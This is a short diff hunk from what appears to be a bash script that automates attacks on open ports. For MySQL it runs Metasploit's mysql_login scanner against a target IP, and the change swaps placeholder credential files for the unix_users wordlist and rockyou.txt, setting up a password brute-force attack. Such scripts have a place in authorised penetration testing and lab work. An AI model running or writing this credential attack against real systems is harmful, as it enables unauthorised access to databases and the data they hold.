@@ -65,8 +65,8 @@ for port in $OPEN_PORTS; do
 	    echo "[+] Checking for Exploitable MySQL Misconfigurations with Metasploit..."
 	    msfconsole -q -x "use auxiliary/scanner/mysql/mysql_login;
 	    set RHOSTS $TARGET_IP;
-            set USER_FILE users.txt;
-            set PASS_FILE passwords.txt;
+            set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt;
+            set PASS_FILE /usr/share/wordlists/rockyou.txt;
             run;
             exit"
 	    ;;
